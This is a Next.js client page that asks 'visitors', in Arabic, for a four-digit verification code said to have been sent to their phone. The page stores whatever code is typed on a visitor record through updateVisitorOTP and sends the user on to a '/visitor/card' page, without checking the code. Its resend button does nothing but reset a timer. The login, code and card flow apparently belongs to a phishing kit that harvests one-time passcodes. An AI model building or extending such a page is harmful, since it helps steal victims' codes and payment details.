"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { updateVisitorOTP } from "@/lib/visitor-actions"

export default function OTPPage() {
  const router = useRouter()
  const [otp, setOtp] = useState(["", "", "", ""])
  const [isLoading, setIsLoading] = useState(false)
  const [timer, setTimer] = useState(30)
  const [mounted, setMounted] = useState(false)
  const [sessionId, setSessionId] = useState("")
  const [docId, setDocId] = useState("")
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    setMounted(true)
    // Get session data from localStorage
    const storedSessionId = localStorage.getItem("visitorSessionId")
    const storedDocId = localStorage.getItem("visitorDocId")
    
    if (!storedSessionId || !storedDocId) {
      router.push("/visitor/login")
      return
    }
    
    setSessionId(storedSessionId)
    setDocId(storedDocId)
  }, [router])

  // Timer countdown
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [timer])

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return // Only allow digits

    const newOtp = [...otp]
    newOtp[index] = value.slice(-1) // Take only last character
    setOtp(newOtp)

    // Auto-focus next input
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const otpValue = otp.join("")
    if (otpValue.length !== 4 || !docId) return

    setIsLoading(true)
    
    try {
      await updateVisitorOTP(docId, sessionId, otpValue)
      router.push("/visitor/card")
    } catch (error) {
      console.error("Error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleResend = () => {
    if (timer === 0) {
      setTimer(30)
      // Here you could add actual resend logic
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  return (
    <div 
      className={`min-h-screen flex flex-col items-center justify-center px-5 transition-opacity duration-500 ${
        mounted ? "opacity-100" : "opacity-0"
      }`}
    >
      <h1 className="text-2xl text-white font-bold mb-4 text-center">
        أدخل رمز التحقق
      </h1>
      
      <p className="text-white/60 text-sm mb-8 text-center">
        تم إرسال رمز التحقق إلى رقم هاتفك
      </p>

      <form onSubmit={handleSubmit} className="w-full max-w-sm">
        {/* OTP Inputs */}
        <div className="flex justify-center gap-3 mb-8" dir="ltr">
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => { inputRefs.current[index] = el }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              className="w-14 h-16 text-center text-xl font-bold rounded-xl bg-white/10 text-white border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all"
            />
          ))}
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={isLoading || otp.join("").length !== 4}
          className="w-full py-4 rounded-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold text-lg shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isLoading ? "جاري التحقق..." : "تأكيد"}
        </button>

        {/* Timer */}
        <div className="text-center mt-4">
          {timer > 0 ? (
            <p className="text-white/60 text-sm">
              إعادة الإرسال خلال {formatTime(timer)}
            </p>
          ) : (
            <button
              type="button"
              onClick={handleResend}
              className="text-green-500 text-sm hover:text-green-400 transition-colors"
            >
              إعادة إرسال الرمز
            </button>
          )}
        </div>
      </form>
    </div>
  )
}
